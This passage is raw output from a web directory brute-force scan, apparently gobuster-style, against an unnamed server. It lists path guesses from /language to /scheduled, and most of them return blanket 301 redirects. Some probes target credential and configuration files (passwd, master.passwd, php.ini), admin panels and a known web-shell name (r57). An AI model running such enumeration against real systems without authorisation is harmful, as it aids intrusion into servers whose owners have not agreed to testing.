/language (Status: 301)
/languages (Status: 301)
/lastpost (Status: 301)
/lastnews (Status: 301)
/large (Status: 301)
/lat_account (Status: 301)
/lat_driver (Status: 301)
/lat_signin (Status: 301)
/lat_getlinking (Status: 301)
/lat_signup (Status: 301)
/launch (Status: 301)
/launchpage (Status: 301)
/lat_signout (Status: 301)
/law (Status: 301)
/launcher (Status: 301)
/kontakt (Status: 301)
/l (Status: 302)
/L (Status: 302)
/leader (Status: 301)
/layouts (Status: 301)
/layout (Status: 301)
/latest (Status: 301)
/leaders (Status: 301)
/ldap (Status: 301)
/learners (Status: 301)
/left (Status: 301)
/learning (Status: 301)
/legacy (Status: 301)
/legislation (Status: 301)
/Legal (Status: 301)
/lenya (Status: 301)
/leads (Status: 301)
/level (Status: 301)
/letters (Status: 301)
/learn (Status: 301)
/legal-notice (Status: 301)
/lg (Status: 301)
/lessons (Status: 301)
/legal (Status: 301)
/lgpl (Status: 301)
/librairies (Status: 301)
/library (Status: 301)
/licence (Status: 301)
/lib (Status: 301)
/lic (Status: 301)
/libraries (Status: 301)
/licenses (Status: 301)
/licensing (Status: 301)
/libs (Status: 301)
/lightbox (Status: 301)
/license (Status: 301)
/line (Status: 301)
/lifestyle (Status: 301)
/life (Status: 301)
/LICENSE (Status: 301)
/link (Status: 301)
/limit (Status: 301)
/license_afl (Status: 301)
/linkmachine (Status: 301)
/linkex (Status: 301)
/Links (Status: 301)
/links_submit (Status: 301)
/links (Status: 301)
/install (Status: 301)
/list (Status: 301)
/linux (Status: 301)
/list_users (Status: 301)
/list-create (Status: 301)
/list-edit (Status: 301)
/link-to-us (Status: 301)
/Linux (Status: 301)
/listings (Status: 301)
/lists (Status: 301)
/list-users (Status: 301)
/lisense (Status: 301)
/listview (Status: 301)
/listinfo (Status: 301)
/list-view (Status: 301)
/listadmin (Status: 301)
/list-search (Status: 301)
/listing (Status: 301)
/livesupport (Status: 301)
/livechat (Status: 301)
/lisence (Status: 301)
/livezilla (Status: 301)
/listusers (Status: 301)
/loader (Status: 301)
/livehelp (Status: 301)
/live (Status: 301)
/localstart (Status: 301)
/loc (Status: 301)
/locale (Status: 301)
/lo (Status: 301)
/locked (Status: 301)
/load (Status: 301)
/locations (Status: 301)
/lockout (Status: 301)
/lock (Status: 301)
/location (Status: 301)
/local (Status: 301)
/loading (Status: 301)
/locator (Status: 301)
/linktous (Status: 301)
/log (Status: 301)
/lofiversion (Status: 301)
/log4net (Status: 301)
/Log (Status: 301)
/logging (Status: 301)
/logfiles (Status: 301)
/Login (Status: 301)
/logger (Status: 301)
/login (Status: 301)
/logfileview (Status: 301)
/LogFiles (Status: 301)
/logfile (Status: 301)
/log4j (Status: 301)
/login_sendpass (Status: 301)
/login1 (Status: 301)
/logo (Status: 301)
/logo_sysadmin (Status: 301)
/login_db (Status: 301)
/login-us (Status: 301)
/loginflat (Status: 301)
/loginadmin (Status: 301)
/logs (Status: 301)
/logins (Status: 301)
/logout (Status: 301)
/Logs (Status: 301)
/login-redirect (Status: 301)
/lost+found (Status: 301)
/logview (Status: 301)
/logon (Status: 301)
/low (Status: 301)
/lost (Status: 301)
/lpt2 (Status: 301)
/lostpassword (Status: 301)
/logoff (Status: 301)
/logos (Status: 301)
/lst (Status: 301)
/love (Status: 301)
/Lotus_Domino_Admin (Status: 301)
/lp (Status: 301)
/lv (Status: 301)
/loja (Status: 301)
/lpt1 (Status: 301)
/ls (Status: 301)
/m1 (Status: 301)
/lunch_menu (Status: 301)
/m6 (Status: 301)
/lt (Status: 301)
/lucene (Status: 301)
/m6_pay (Status: 301)
/m7 (Status: 301)
/macromedia (Status: 301)
/m_images (Status: 301)
/m6_invoice (Status: 301)
/m6_edit_item (Status: 301)
/magazin (Status: 301)
/ma (Status: 301)
/mac (Status: 301)
/macadmin (Status: 301)
/magic (Status: 301)
/magazine (Status: 301)
/magento (Status: 301)
/magazines (Status: 301)
/maestro (Status: 301)
/mail_link (Status: 301)
/magnifier_xml (Status: 301)
/magpierss (Status: 301)
/mail (Status: 301)
/mailinglist (Status: 301)
/mail_password (Status: 301)
/mailbox (Status: 301)
/mailer (Status: 301)
/mails (Status: 301)
/mailing (Status: 301)
/mailings (Status: 301)
/Main (Status: 301)
/maillist (Status: 301)
/mailman (Status: 301)
/mailto (Status: 301)
/mainfile (Status: 301)
/mailtemplates (Status: 301)
/main (Status: 301)
/maintenance (Status: 301)
/Main_Page (Status: 301)
/maint (Status: 301)
/maintainers (Status: 301)
/mainten (Status: 301)
/makefile (Status: 301)
/Makefile (Status: 301)
/mall (Status: 301)
/mambo (Status: 301)
/mal (Status: 301)
/mambots (Status: 301)
/man (Status: 301)
/mana (Status: 301)
/manage (Status: 301)
/m (Status: 302)
/manager (Status: 301)
/managed (Status: 301)
/manual (Status: 301)
/manifest (Status: 301)
/management (Status: 301)
/M (Status: 302)
/mantis (Status: 301)
/manuallogin (Status: 301)
/map (Status: 301)
/manufacturers (Status: 301)
/maps (Status: 301)
/manuals (Status: 301)
/manufacturer (Status: 301)
/mark (Status: 301)
/market (Status: 301)
/marketplace (Status: 301)
/marketing (Status: 301)
/markets (Status: 301)
/master (Status: 301)
/masters (Status: 301)
/masthead (Status: 301)
/match (Status: 301)
/masterpages (Status: 301)
/matches (Status: 301)
/math (Status: 301)
/main.mdb (Status: 302)
/matt (Status: 301)
/matrix (Status: 301)
/mb (Status: 301)
/mc (Status: 301)
/maven (Status: 301)
/mbox (Status: 301)
/mbo (Status: 301)
/mdb (Status: 301)
/mcp (Status: 301)
/me (Status: 301)
/mdb-database (Status: 301)
/mchat (Status: 301)
/media (Status: 301)
/Media (Status: 301)
/mediaplayer (Status: 301)
/mediakit (Status: 301)
/MANIFEST.MF (Status: 302)
/media_center (Status: 301)
/medias (Status: 301)
/mediawiki (Status: 301)
/manifest.mf (Status: 302)
/medium (Status: 301)
/meetings (Status: 301)
/member (Status: 301)
/mein-konto (Status: 301)
/mein-merkzettel (Status: 301)
/mem (Status: 301)
/master.passwd (Status: 302)
/member2 (Status: 301)
/members (Status: 301)
/memcp (Status: 301)
/memo (Status: 301)
/memlogin (Status: 301)
/memcached (Status: 301)
/memberlist (Status: 301)
/menus (Status: 301)
/membres (Status: 301)
/membre (Status: 301)
/membership (Status: 301)
/Menus (Status: 301)
/Members (Status: 301)
/menu (Status: 301)
/merchant2 (Status: 301)
/merchant (Status: 301)
/message (Status: 301)
/messageboard (Status: 301)
/messaging (Status: 301)
/meta (Status: 301)
/meta_tags (Status: 301)
/meta_login (Status: 301)
/metabase (Status: 301)
/messages (Status: 301)
/metaframe (Status: 301)
/metadata (Status: 301)
/memory (Status: 301)
/meta-inf (Status: 301)
/mgr (Status: 301)
/metatags (Status: 301)
/midi (Status: 301)
/META-INF (Status: 301)
/migrate (Status: 301)
/migrated (Status: 301)
/michael (Status: 301)
/microsoft (Status: 301)
/migration (Status: 301)
/mine (Status: 301)
/military (Status: 301)
/mina (Status: 301)
/min (Status: 301)
/minimum (Status: 301)
/mini (Status: 301)
/minicart (Status: 301)
/mint (Status: 301)
/minute (Status: 301)
/mirrors (Status: 301)
/misc (Status: 301)
/mission (Status: 301)
/mix (Status: 301)
/Misc (Status: 301)
/missing (Status: 301)
/miscellaneous (Status: 301)
/mk (Status: 301)
/mini_cal (Status: 301)
/mkstats (Status: 301)
/mirror (Status: 301)
/mm (Status: 301)
/mlist (Status: 301)
/mobi (Status: 301)
/mobile (Status: 301)
/ml (Status: 301)
/mms (Status: 301)
/mo (Status: 301)
/mmwip (Status: 301)
/mm5 (Status: 301)
/mode (Status: 301)
/mobil (Status: 301)
/model (Status: 301)
/mock (Status: 301)
/mod (Status: 301)
/moderation (Status: 301)
/models (Status: 301)
/modcp (Status: 301)
/modem (Status: 301)
/modelsearch (Status: 301)
/moderator (Status: 301)
/mojo (Status: 301)
/modify (Status: 301)
/modlogan (Status: 301)
/mods (Status: 301)
/module (Status: 301)
/modulos (Status: 301)
/money (Status: 301)
/monitor (Status: 301)
/month (Status: 301)
/monitoring (Status: 301)
/monitors (Status: 301)
/monthly (Status: 301)
/more (Status: 301)
/motd (Status: 301)
/moodle (Status: 301)
/moto1 (Status: 301)
/modules (Status: 301)
/moto-news (Status: 301)
/mount (Status: 301)
/mp3 (Status: 301)
/move (Status: 301)
/moved (Status: 301)
/movie (Status: 301)
/mozilla (Status: 301)
/movies (Status: 301)
/mp (Status: 301)
/mp3s (Status: 301)
/mrtg (Status: 301)
/mqseries (Status: 301)
/msadc (Status: 301)
/ms (Status: 301)
/msadm (Status: 301)
/msft (Status: 301)
/msie (Status: 301)
/msg (Status: 301)
/msn (Status: 301)
/mspace (Status: 301)
/msoffice (Status: 301)
/msql (Status: 301)
/mstpre (Status: 301)
/ms-sql (Status: 301)
/mssql (Status: 301)
/mt-bin (Status: 301)
/mt (Status: 301)
/mta (Status: 301)
/mt-static (Status: 301)
/multimedia (Status: 301)
/music (Status: 301)
/mt-search (Status: 301)
/Music (Status: 301)
/multi (Status: 301)
/my (Status: 301)
/mx (Status: 301)
/myaccount (Status: 301)
/my-account (Status: 301)
/mycalendar (Status: 301)
/myblog (Status: 301)
/myadmin (Status: 301)
/my-components (Status: 301)
/mycgi (Status: 301)
/myfaces (Status: 301)
/my-gift-registry (Status: 301)
/myhomework (Status: 301)
/myicons (Status: 301)
/myspace (Status: 301)
/myphpnuke (Status: 301)
/mysql (Status: 301)
/mypage (Status: 301)
/mysqldumper (Status: 301)
/mysqld (Status: 301)
/my-sql (Status: 301)
/mytag_js (Status: 301)
/mysqlmanager (Status: 301)
/my-wishlist (Status: 301)
/mytp (Status: 301)
/nachrichten (Status: 301)
/nagios (Status: 301)
/national (Status: 301)
/names (Status: 301)
/moving.page (Status: 302)
/nav (Status: 301)
/navsiteadmin (Status: 301)
/navigation (Status: 301)
/navSiteAdmin (Status: 301)
/net (Status: 301)
/name (Status: 301)
/nc (Status: 301)
/ne (Status: 301)
/netcat (Status: 301)
/nethome (Status: 301)
/netstat (Status: 301)
/netbsd (Status: 301)
/nets (Status: 301)
/netscape (Status: 301)
/network (Status: 301)
/netstorage (Status: 301)
/new (Status: 301)
/newadmin (Status: 301)
/networking (Status: 301)
/newattachment (Status: 301)
/newreply (Status: 301)
/newposts (Status: 301)
/News (Status: 301)
/news (Status: 301)
/news_insert (Status: 301)
/newsadmin (Status: 301)
/newsletter (Status: 301)
/newsite (Status: 301)
/newsletters (Status: 301)
/newsroom (Status: 301)
/newsline (Status: 301)
/newssys (Status: 301)
/newstarter (Status: 301)
/newthread (Status: 301)
/newticket (Status: 301)
/next (Status: 301)
/nfs (Status: 301)
/nieuws (Status: 301)
/nice (Status: 301)
/n (Status: 302)
/ningbar (Status: 301)
/nk9 (Status: 301)
/no (Status: 301)
/N (Status: 302)
/nl (Status: 301)
/nobody (Status: 301)
/node (Status: 301)
/nokia (Status: 301)
/noindex (Status: 301)
/notfound (Status: 301)
/no-index (Status: 301)
/note (Status: 301)
/none (Status: 301)
/noticias (Status: 301)
/notes (Status: 301)
/notification (Status: 301)
/notifications (Status: 301)
/notified (Status: 301)
/notifier (Status: 301)
/notify (Status: 301)
/novell (Status: 301)
/nr (Status: 301)
/ns (Status: 301)
/nsf (Status: 301)
/ntopic (Status: 301)
/nude (Status: 301)
/nuke (Status: 301)
/nul (Status: 301)
/nxfeed (Status: 301)
/null (Status: 301)
/number (Status: 301)
/nz (Status: 301)
/OA_HTML (Status: 301)
/oa_servlets (Status: 301)
/OAErrorDetailPage (Status: 301)
/OasDefault (Status: 301)
/oauth (Status: 301)
/obdc (Status: 301)
/OA (Status: 301)
/obj (Status: 301)
/object (Status: 301)
/oem (Status: 301)
/objects (Status: 301)
/obsolete (Status: 301)
/obsoleted (Status: 301)
/odbc (Status: 301)
/ode (Status: 301)
/of (Status: 301)
/offer (Status: 301)
/ofbiz (Status: 301)
/offerdetail (Status: 301)
/off (Status: 301)
/Office (Status: 301)
/offers (Status: 301)
/office (Status: 301)
/offices (Status: 301)
/ogl (Status: 301)
/offline (Status: 301)
/old (Status: 301)
/old_site (Status: 301)
/oldsite (Status: 301)
/oldie (Status: 301)
/old-site (Status: 301)
/omited (Status: 301)
/on (Status: 301)
/onbound (Status: 301)
/online (Status: 301)
/onsite (Status: 301)
/open (Status: 301)
/open-account (Status: 301)
/op (Status: 301)
/openapp (Status: 301)
/openads (Status: 301)
/openbsd (Status: 301)
/opencart (Status: 301)
/opendir (Status: 301)
/openejb (Status: 301)
/openfile (Status: 301)
/openjpa (Status: 301)
/opensource (Status: 301)
/O (Status: 302)
/opensearch (Status: 301)
/openx (Status: 301)
/o (Status: 302)
/opera (Status: 301)
/openvpnadmin (Status: 301)
/opml (Status: 301)
/operations (Status: 301)
/opinion (Status: 301)
/operator (Status: 301)
/option (Status: 301)
/opinions (Status: 301)
/opros (Status: 301)
/opt (Status: 301)
/options (Status: 301)
/ora (Status: 301)
/oradata (Status: 301)
/oracle (Status: 301)
/order_history (Status: 301)
/order (Status: 301)
/order_status (Status: 301)
/orderdownloads (Status: 301)
/orderstatus (Status: 301)
/orderfinished (Status: 301)
/order-return (Status: 301)
/order-slip (Status: 301)
/order-opc (Status: 301)
/order-follow (Status: 301)
/ordered (Status: 301)
/orders (Status: 301)
/order-history (Status: 301)
/order-detail (Status: 301)
/org (Status: 301)
/ordertotal (Status: 301)
/orig (Status: 301)
/organisations (Status: 301)
/oscommerce (Status: 301)
/osc (Status: 301)
/original (Status: 301)
/organizations (Status: 301)
/other (Status: 301)
/organisation (Status: 301)
/os (Status: 301)
/out (Status: 301)
/otrs (Status: 301)
/outreach (Status: 301)
/outgoing (Status: 301)
/outline (Status: 301)
/outils (Status: 301)
/output (Status: 301)
/outcome (Status: 301)
/others (Status: 301)
/oversikt (Status: 301)
/owa (Status: 301)
/owl (Status: 301)
/overview (Status: 301)
/ows (Status: 301)
/owners (Status: 301)
/ows-bin (Status: 301)
/pa (Status: 301)
/package (Status: 301)
/packaged (Status: 301)
/pack (Status: 301)
/packages (Status: 301)
/packaging (Status: 301)
/p7pm (Status: 301)
/page (Status: 301)
/p2p (Status: 301)
/page1 (Status: 301)
/page2 (Status: 301)
/page_1 (Status: 301)
/page_2 (Status: 301)
/packed (Status: 301)
/pageid (Status: 301)
/pad (Status: 301)
/pagenotfound (Status: 301)
/page_sample1 (Status: 301)
/page-not-found (Status: 301)
/pager (Status: 301)
/pages (Status: 301)
/paid (Status: 301)
/pam (Status: 301)
/pagination (Status: 301)
/Pages (Status: 301)
/paiement (Status: 301)
/papers (Status: 301)
/panel (Status: 301)
/paper (Status: 301)
/panelc (Status: 301)
/parse (Status: 301)
/part (Status: 301)
/passive (Status: 301)
/passes (Status: 301)
/party (Status: 301)
/partners (Status: 301)
/partner (Status: 301)
/pass (Status: 301)
/parts (Status: 301)
/partenaires (Status: 301)
/passport (Status: 301)
/passw (Status: 301)
/password (Status: 301)
/patch (Status: 301)
/past (Status: 301)
/passwor (Status: 301)
/passwd (Status: 301)
/passwords (Status: 301)
/pay (Status: 301)
/patents (Status: 301)
/payment (Status: 301)
/paypal (Status: 301)
/payment_gateway (Status: 301)
/payments (Status: 301)
/patches (Status: 301)
/P (Status: 302)
/path (Status: 301)
/p (Status: 302)
/pbc_download (Status: 301)
/paypalok (Status: 301)
/paypalcancel (Status: 301)
/paypal_notify (Status: 301)
/pc (Status: 301)
/pbo (Status: 301)
/pbcs (Status: 301)
/pbcsad (Status: 301)
/pci (Status: 301)
/pbcsi (Status: 301)
/pdf (Status: 301)
/pda (Status: 301)
/pd (Status: 301)
/PDF (Status: 301)
/pdf-invoice (Status: 301)
/pear (Status: 301)
/pdfs (Status: 301)
/peek (Status: 301)
/pdf-order-slip (Status: 301)
/peel (Status: 301)
/pem (Status: 301)
/pconf (Status: 301)
/pending (Status: 301)
/people (Status: 301)
/People (Status: 301)
/perf (Status: 301)
/performance (Status: 301)
/personals (Status: 301)
/personal (Status: 301)
/perl5 (Status: 301)
/perl (Status: 301)
/pfx (Status: 301)
/person (Status: 301)
/pgadmin (Status: 301)
/pg (Status: 301)
/pgp (Status: 301)
/phone (Status: 301)
/pgsql (Status: 301)
/phishing (Status: 301)
/phf (Status: 301)
/phorum (Status: 301)
/photo (Status: 301)
/phones (Status: 301)
/photodetails (Status: 301)
/photography (Status: 301)
/photogallery (Status: 301)
/php (Status: 301)
/php_uploads (Status: 301)
/PHP (Status: 301)
/photos (Status: 301)
/phpadmin (Status: 301)
/php168 (Status: 301)
/php3 (Status: 301)
/phpadsnew (Status: 301)
/phpads (Status: 301)
/phpBB (Status: 301)
/phpbb2 (Status: 301)
/phpBB2 (Status: 301)
/phpbb3 (Status: 301)
/phpBB3 (Status: 301)
/php-bin (Status: 301)
/php-cgi (Status: 301)
/phpEventCalendar (Status: 301)
/phpbb (Status: 301)
/phpinfo (Status: 301)
/phpmv2 (Status: 301)
/phpinfos (Status: 301)
/phpldapadmin (Status: 301)
/phplist (Status: 301)
/phplive (Status: 301)
/phpmailer (Status: 301)
/phpmanual (Status: 301)
/phpMyAdmin (Status: 301)
/phpmyadmin (Status: 301)
/phpmyadmin2 (Status: 301)
/phpMyAdmin2 (Status: 301)
/phppgadmin (Status: 301)
/phpsitemapng (Status: 301)
/phps (Status: 301)
/phpinfo.php (Status: 302)
/php.ini (Status: 302)
/pics (Status: 301)
/phpthumb (Status: 301)
/phtml (Status: 301)
/pic (Status: 301)
/phpSQLiteAdmin (Status: 301)
/phpnuke (Status: 301)
/pingback (Status: 301)
/pictures (Status: 301)
/picturecomment (Status: 301)
/picture_library (Status: 301)
/picture (Status: 301)
/picts (Status: 301)
/piranha (Status: 301)
/pipe (Status: 301)
/pipermail (Status: 301)
/pii (Status: 301)
/ping (Status: 301)
/pivot (Status: 301)
/piwik (Status: 301)
/pkgs (Status: 301)
/pl (Status: 301)
/pixelpost (Status: 301)
/pkginfo (Status: 301)
/pkg (Status: 301)
/placeorder (Status: 301)
/places (Status: 301)
/pixel (Status: 301)
/platz_login (Status: 301)
/play (Status: 301)
/plate (Status: 301)
/plain (Status: 301)
/player (Status: 301)
/plenty (Status: 301)
/plesk-stat (Status: 301)
/players (Status: 301)
/please (Status: 301)
/playing (Status: 301)
/pls (Status: 301)
/plugin (Status: 301)
/plugins (Status: 301)
/pix (Status: 301)
/PMA (Status: 301)
/pma (Status: 301)
/playlist (Status: 301)
/plus (Status: 301)
/pm (Status: 301)
/pnadodb (Status: 301)
/png (Status: 301)
/pntables (Status: 301)
/podcasts (Status: 301)
/podcast (Status: 301)
/podcasting (Status: 301)
/poc (Status: 301)
/pntemp (Status: 301)
/pmwiki (Status: 301)
/plx (Status: 301)
/poker (Status: 301)
/poi (Status: 301)
/poll (Status: 301)
/pollbooth (Status: 301)
/polls (Status: 301)
/pollvote (Status: 301)
/pol (Status: 301)
/policies (Status: 301)
/politics (Status: 301)
/policy (Status: 301)
/popup (Status: 301)
/popular (Status: 301)
/populate (Status: 301)
/pop (Status: 301)
/pool (Status: 301)
/pop3 (Status: 301)
/popup_cvv (Status: 301)
/popup_info (Status: 301)
/popup_image (Status: 301)
/port (Status: 301)
/popups (Status: 301)
/popup_magnifier (Status: 301)
/porn (Status: 301)
/popup_content (Status: 301)
/portfolio (Status: 301)
/portal (Status: 301)
/popup_poptions (Status: 301)
/portals (Status: 301)
/ports (Status: 301)
/portfoliofiles (Status: 301)
/post (Status: 301)
/portlets (Status: 301)
/portlet (Status: 301)
/pos (Status: 301)
/postcards (Status: 301)
/postcard (Status: 301)
/posthistory (Status: 301)
/postgresql (Status: 301)
/posted (Status: 301)
/postinfo (Status: 301)
/postgres (Status: 301)
/post_thanks (Status: 301)
/postings (Status: 301)
/posting (Status: 301)
/postnuke (Status: 301)
/postpaid (Status: 301)
/postreview (Status: 301)
/posts (Status: 301)
/posttocar (Status: 301)
/power (Status: 301)
/pp (Status: 301)
/power_user (Status: 301)
/ppc (Status: 301)
/ppcredir (Status: 301)
/preload (Status: 301)
/preferences (Status: 301)
/pre (Status: 301)
/pr0n (Status: 301)
/ppt (Status: 301)
/pr (Status: 301)
/prepaid (Status: 301)
/prepare (Status: 301)
/premiere (Status: 301)
/premium (Status: 301)
/preserve (Status: 301)
/presentations (Status: 301)
/press_releases (Status: 301)
/presentation (Status: 301)
/Press (Status: 301)
/press (Status: 301)
/pressreleases (Status: 301)
/pressroom (Status: 301)
/presse (Status: 301)
/prices (Status: 301)
/prev (Status: 301)
/previous (Status: 301)
/pricelist (Status: 301)
/preview (Status: 301)
/price (Status: 301)
/previews (Status: 301)
/pricing (Status: 301)
/printer (Status: 301)
/print_order (Status: 301)
/printarticle (Status: 301)
/printenv (Status: 301)
/printable (Status: 301)
/printmail (Status: 301)
/printers (Status: 301)
/print (Status: 301)
/printpdf (Status: 301)
/printview (Status: 301)
/printthread (Status: 301)
/priv (Status: 301)
/privacy (Status: 301)
/Privacy (Status: 301)
/privacypolicy (Status: 301)
/privat (Status: 301)
/private (Status: 301)
/privacy-policy (Status: 301)
/private2 (Status: 301)
/privateassets (Status: 301)
/privacy_policy (Status: 301)
/privatemsg (Status: 301)
/privmsg (Status: 301)
/prive (Status: 301)
/privs (Status: 301)
/pro (Status: 301)
/prn (Status: 301)
/procedures (Status: 301)
/probe (Status: 301)
/problems (Status: 301)
/proc (Status: 301)
/process (Status: 301)
/processform (Status: 301)
/process_order (Status: 301)
/procurement (Status: 301)
/procure (Status: 301)
/prodconf (Status: 301)
/prod (Status: 301)
/prodimages (Status: 301)
/product_image (Status: 301)
/product (Status: 301)
/producers (Status: 301)
/product_info (Status: 301)
/product_compare (Status: 301)
/product_images (Status: 301)
/product_reviews (Status: 301)
/product_thumb (Status: 301)
/productdetails (Status: 301)
/productimage (Status: 301)
/productquestion (Status: 301)
/production (Status: 301)
/Products (Status: 301)
/product-sort (Status: 301)
/products_new (Status: 301)
/productupdates (Status: 301)
/productspecs (Status: 301)
/produkte (Status: 301)
/products (Status: 301)
/professor (Status: 301)
/profile (Status: 301)
/profil (Status: 301)
/profiles (Status: 301)
/Program Files (Status: 301)
/proftpd (Status: 301)
/profiling (Status: 301)
/prog (Status: 301)
/program (Status: 301)
/programming (Status: 301)
/programs (Status: 301)
/project-admins (Status: 301)
/progress (Status: 301)
/project (Status: 301)
/projects (Status: 301)
/promos (Status: 301)
/Projects (Status: 301)
/promoted (Status: 301)
/promo (Status: 301)
/promotion (Status: 301)
/proof (Status: 301)
/promotions (Status: 301)
/proofs (Status: 301)
/prop (Status: 301)
/properties (Status: 301)
/prop-base (Status: 301)
/property (Status: 301)
/prot (Status: 301)
/props (Status: 301)
/protection (Status: 301)
/protect (Status: 301)
/proto (Status: 301)
/protected (Status: 301)
/provider (Status: 301)
/proxies (Status: 301)
/providers (Status: 301)
/prueba (Status: 301)
/proxy (Status: 301)
/prv_download (Status: 301)
/prv (Status: 301)
/ps (Status: 301)
/psd (Status: 301)
/psp (Status: 301)
/pruebas (Status: 301)
/pt_BR (Status: 301)
/pt (Status: 301)
/psql (Status: 301)
/pub (Status: 301)
/ptopic (Status: 301)
/public (Status: 301)
/public_ftp (Status: 301)
/public_html (Status: 301)
/publication (Status: 301)
/publications (Status: 301)
/Publications (Status: 301)
/publish (Status: 301)
/publicidad (Status: 301)
/published (Status: 301)
/production.log (Status: 302)
/publisher (Status: 301)
/purchase (Status: 301)
/pubs (Status: 301)
/purchases (Status: 301)
/purchasing (Status: 301)
/put (Status: 301)
/pureadmin (Status: 301)
/pull (Status: 301)
/push (Status: 301)
/putty (Status: 301)
/pw (Status: 301)
/pw_api (Status: 301)
/python (Status: 301)
/pwd (Status: 301)
/pw_ajax (Status: 301)
/pw_app (Status: 301)
/py (Status: 301)
/q2 (Status: 301)
/q4 (Status: 301)
/q3 (Status: 301)
/qa (Status: 301)
/qinetiq (Status: 301)
/qotd (Status: 301)
/qpid (Status: 301)
/q1 (Status: 301)
/qsc (Status: 301)
/quarterly (Status: 301)
/queries (Status: 301)
/queues (Status: 301)
/query (Status: 301)
/question (Status: 301)
/questions (Status: 301)
/queue (Status: 301)
/quote (Status: 301)
/quick (Status: 301)
/quickstart (Status: 301)
/quotes (Status: 301)
/quiz (Status: 301)
/r57 (Status: 301)
/radio (Status: 301)
/radcontrols (Status: 301)
/radmind (Status: 301)
/radmind-1 (Status: 301)
/rail (Status: 301)
/rails (Status: 301)
/ramon (Status: 301)
/Rakefile (Status: 301)
/random (Status: 301)
/ranks (Status: 301)
/rank (Status: 301)
/rarticles (Status: 301)
/rar (Status: 301)
/rate (Status: 301)
/ratepic (Status: 301)
/ratecomment (Status: 301)
/q (Status: 302)
/putty.reg (Status: 302)
/ratethread (Status: 301)
/rateit (Status: 301)
/rb (Status: 301)
/rcLogin (Status: 301)
/rating (Status: 301)
/rates (Status: 301)
/ratings (Status: 301)
/rating0 (Status: 301)
/rcp (Status: 301)
/rd (Status: 301)
/rct (Status: 301)
/RCS (Status: 301)
/rdf (Status: 301)
/reader (Status: 301)
/rcs (Status: 301)
/read (Status: 301)
/R (Status: 302)
/readfile (Status: 301)
/realaudio (Status: 301)
/readme (Status: 301)
/Readme (Status: 301)
/README (Status: 301)
/readfolder (Status: 301)
/RealMedia (Status: 301)
/r (Status: 302)
/real (Status: 301)
/receipts (Status: 301)
/realestate (Status: 301)
/receive (Status: 301)
/recent (Status: 301)
/recherche (Status: 301)
/recharge (Status: 301)
/received (Status: 301)
/recipes (Status: 301)
/receipt (Status: 301)
/recommends (Status: 301)
/recommend (Status: 301)
/records (Status: 301)
/record (Status: 301)
/recorded (Status: 301)
/Recycled (Status: 301)
/recovery (Status: 301)
/recoverpassword (Status: 301)
/recorder (Status: 301)
/red (Status: 301)
/recycle (Status: 301)
/recycled (Status: 301)
/redesign (Status: 301)
/reddit (Status: 301)
/redirect (Status: 301)
/redir (Status: 301)
/redirector (Status: 301)
/redirects (Status: 301)
/redirection (Status: 301)
/redis (Status: 301)
/refer (Status: 301)
/ref (Status: 301)
/reference (Status: 301)
/references (Status: 301)
/referer (Status: 301)
/referral (Status: 301)
/referrers (Status: 301)
/refuse (Status: 301)
/reg (Status: 301)
/refused (Status: 301)
/regional (Status: 301)
/region (Status: 301)
/register (Status: 301)
/reginternal (Status: 301)
/registered (Status: 301)
/registration (Status: 301)
/registrations (Status: 301)
/registro (Status: 301)
/related (Status: 301)
/reklama (Status: 301)
/releases (Status: 301)
/remind (Status: 301)
/religion (Status: 301)
/remind_password (Status: 301)
/release (Status: 301)
/remote (Status: 301)
/reminder (Status: 301)
/remotetracer (Status: 301)
/removal (Status: 301)
/removals (Status: 301)
/render (Status: 301)
/removed (Status: 301)
/remove (Status: 301)
/rendered (Status: 301)
/reorder (Status: 301)
/repl (Status: 301)
/replicas (Status: 301)
/rep (Status: 301)
/replica (Status: 301)
/replicate (Status: 301)
/replication (Status: 301)
/replicator (Status: 301)
/reply (Status: 301)
/replicated (Status: 301)
/repo (Status: 301)
/reports (Status: 301)
/repost (Status: 301)
/reporting (Status: 301)
/reports list (Status: 301)
/reprints (Status: 301)
/reputation (Status: 301)
/repository (Status: 301)
/req (Status: 301)
/reqs (Status: 301)
/report (Status: 301)
/request (Status: 301)
/require (Status: 301)
/requests (Status: 301)
/requested (Status: 301)
/Research (Status: 301)
/requisition (Status: 301)
/requisite (Status: 301)
/research (Status: 301)
/requisitions (Status: 301)
/res (Status: 301)
/reseller (Status: 301)
/reservation (Status: 301)
/resin (Status: 301)
/resellers (Status: 301)
/reservations (Status: 301)
/resolve (Status: 301)
/resize (Status: 301)
/resolution (Status: 301)
/resolved (Status: 301)
/resin-admin (Status: 301)
/resource (Status: 301)
/resources (Status: 301)
/Resources (Status: 301)
/respond (Status: 301)
/responder (Status: 301)
/rest (Status: 301)
/restored (Status: 301)
/restaurants (Status: 301)
/restore (Status: 301)
/restricted (Status: 301)
/results (Status: 301)
/result (Status: 301)
/resume (Status: 301)
/resumes (Status: 301)
/reverse (Status: 301)
/returns (Status: 301)
/retail (Status: 301)
/reversed (Status: 301)
/revert (Status: 301)
/reverted (Status: 301)
/reviews (Status: 301)
/rfid (Status: 301)
/rhtml (Status: 301)
/ro (Status: 301)
/roaming (Status: 301)
/roadmap (Status: 301)
/robotics (Status: 301)
/roam (Status: 301)
/right (Status: 301)
/robots (Status: 301)
/robot (Status: 301)
/role (Status: 301)
/review (Status: 301)
/roller (Status: 301)
/roles (Status: 301)
/rortopics (Status: 301)
/rorentity (Status: 301)
/reusablecontent (Status: 301)
/Root (Status: 301)
/room (Status: 301)
/root (Status: 301)
/route (Status: 301)
/router (Status: 301)
/rorindex (Status: 301)
/rpc (Status: 301)
/RSS (Status: 301)
/robots.txt (Status: 200)
/rss (Status: 301)
/rssfeed (Status: 301)
/rss20 (Status: 301)
/rss10 (Status: 301)
/rs (Status: 301)
/rsync (Status: 301)
/rte (Status: 301)
/rtf (Status: 301)
/routes (Status: 301)
/rssarticle (Status: 301)
/ru (Status: 301)
/ruby (Status: 301)
/rub (Status: 301)
/rss2 (Status: 301)
/rsa (Status: 301)
/rule (Status: 301)
/rus (Status: 301)
/safety (Status: 301)
/safe (Status: 301)
/sale (Status: 301)
/sales (Status: 301)
/salesforce (Status: 301)
/rules (Status: 301)
/sam (Status: 301)
/s1 (Status: 301)
/rwservlet (Status: 301)
/sa (Status: 301)
/run (Status: 301)
/sample (Status: 301)
/samba (Status: 301)
/saml (Status: 301)
/samples (Status: 301)
/san (Status: 301)
/sandbox (Status: 301)
/sav (Status: 301)
/save (Status: 301)
/saved (Status: 301)
/saves (Status: 301)
/sb (Status: 301)
/sbin (Status: 301)
/sc (Status: 301)
/scanned (Status: 301)
/scan (Status: 301)
/scans (Status: 301)
/scgi-bin (Status: 301)
/sched (Status: 301)
/scheduled (Status: 301)
